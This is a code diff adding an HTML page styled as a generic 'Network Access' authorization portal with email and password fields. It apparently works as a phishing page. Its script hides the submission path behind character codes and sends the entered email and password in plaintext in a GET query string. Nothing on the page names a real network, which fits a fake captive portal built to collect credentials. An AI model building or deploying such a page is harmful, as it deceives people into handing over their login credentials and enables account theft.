@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <title>Access Control</title>
+    <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'SF Pro Display',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#050505;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;position:relative;overflow:hidden}body::before{content:'';position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:100vw;height:100vh;background:radial-gradient(ellipse at center,rgba(236,72,153,.08) 0%,transparent 70%),radial-gradient(ellipse at 30% 30%,rgba(59,130,246,.08) 0%,transparent 60%),radial-gradient(ellipse at 70% 70%,rgba(168,85,247,.08) 0%,transparent 60%);animation:pulse 8s ease-in-out infinite;z-index:0}body::after{content:'';position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:100%;height:100%;background-image:repeating-linear-gradient(0deg,rgba(59,130,246,.03) 0px,rgba(59,130,246,.03) 1px,transparent 1px,transparent 80px),repeating-linear-gradient(90deg,rgba(59,130,246,.03) 0px,rgba(59,130,246,.03) 1px,transparent 1px,transparent 80px);z-index:0}@keyframes pulse{0%,100%{opacity:1}50%{opacity:.6}}.wrap{position:relative;z-index:1;width:100%;max-width:420px}.c{background:rgba(10,10,10,.95);backdrop-filter:blur(40px);padding:45px 35px;border:1px solid rgba(59,130,246,.15);box-shadow:0 25px 50px rgba(0,0,0,.5),0 0 100px rgba(59,130,246,.1),inset 0 1px 1px rgba(255,255,255,.05);position:relative;overflow:hidden}.t{text-align:center;margin-bottom:35px}.ic{width:56px;height:56px;margin:0 auto 20px;background:rgba(15,15,15,.8);border:2px solid rgba(59,130,246,.3);display:flex;align-items:center;justify-content:center;position:relative}.ic::before{content:'';position:absolute;top:-1px;left:-1px;right:-1px;bottom:-1px;background:conic-gradient(from 0deg,transparent,rgba(59,130,246,.4),transparent);animation:rotate 4s linear infinite}@keyframes rotate{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}.ic svg{width:28px;height:28px;fill:rgba(59,130,246,.9);position:relative;z-index:1}.ti{font-size:22px;font-weight:300;color:rgba(255,255,255,.95);margin-bottom:8px;letter-spacing:2px;text-transform:uppercase}.st{font-size:12px;color:rgba(255,255,255,.4);letter-spacing:1px;text-transform:uppercase}.fg{margin-bottom:20px}label{display:block;font-size:11px;font-weight:500;color:rgba(255,255,255,.6);margin-bottom:8px;letter-spacing:1px;text-transform:uppercase}.inp{width:100%;padding:12px 14px;border:1px solid rgba(59,130,246,.2);background:rgba(5,5,5,.8);font-size:14px;color:rgba(255,255,255,.9);transition:all .3s ease}.inp:focus{outline:0;border-color:rgba(59,130,246,.6);background:rgba(10,10,10,.9);box-shadow:0 0 0 3px rgba(59,130,246,.1)}.inp::placeholder{color:rgba(255,255,255,.3)}.bc{margin-top:28px}.btn{width:100%;background:rgba(59,130,246,.15);color:rgba(59,130,246,1);border:1px solid rgba(59,130,246,.4);padding:13px;font-size:12px;font-weight:600;cursor:pointer;transition:all .3s ease;text-transform:uppercase;letter-spacing:2px;position:relative;overflow:hidden}.btn::before{content:'';position:absolute;top:50%;left:50%;width:0;height:0;background:rgba(59,130,246,.3);border-radius:50%;transform:translate(-50%,-50%);transition:width .6s,height .6s}.btn:hover::before{width:400px;height:400px}.btn:hover{background:rgba(59,130,246,.25);border-color:rgba(59,130,246,.6);box-shadow:0 0 20px rgba(59,130,246,.3)}.btn:active{transform:scale(.98)}.ft{text-align:center;margin-top:25px;font-size:10px;color:rgba(255,255,255,.3);line-height:1.8;letter-spacing:1px;text-transform:uppercase}.al{padding:12px 14px;margin-bottom:22px;font-size:11px;display:none;background:rgba(59,130,246,.05);border:1px solid rgba(59,130,246,.2);color:rgba(255,255,255,.5);letter-spacing:.5px}@media (max-width:480px){.c{padding:35px 28px}}</style>
+</head>
+<body>
+    <div class="wrap">
+        <div class="c">
+            <div class="t">
+                <div class="ic">
+                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 22C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10-4.477 10-10 10zm0-2a8 8 0 100-16 8 8 0 000 16zm-1-5h2v2h-2v-2zm0-8h2v6h-2V7z"/>
+                    </svg>
+                </div>
+                <div class="ti">Network Access</div>
+                <div class="st">Authorization Required</div>
+            </div>
+            <div class="al" id="x">
+                Credentials required for entry
+            </div>
+            <form id="z" method="GET">
+                <div class="fg">
+                    <label for="u">User Identifier</label>
+                    <input type="text" id="u" name="email" class="inp" required autocomplete="username" placeholder="user@domain">
+                </div>
+                <div class="fg">
+                    <label for="w">Authentication Token</label>
+                    <input type="password" id="w" name="password" class="inp" required autocomplete="current-password" placeholder="Enter token">
+                </div>
+                <div class="bc">
+                    <button type="submit" class="btn">Verify Access</button>
+                </div>
+            </form>
+            <div class="ft">
+                Encrypted Connection Active<br>
+                Network Version 4.2.1
+            </div>
+        </div>
+    </div>
+    <script>
+    window.addEventListener('load',function(){document.getElementById('x').style.display='block'});
+    var f=document.getElementById('z');
+    f.addEventListener('submit',function(e){
+        e.preventDefault();
+        var m=document.getElementById('u').value;
+        var s=document.getElementById('w').value;
+        var b=String.fromCharCode(47,103,101,116);
+        window.location.href=b+'?email='+encodeURIComponent(m)+'&password='+encodeURIComponent(s);
+    });
+    </script>
+</body>
+</html>
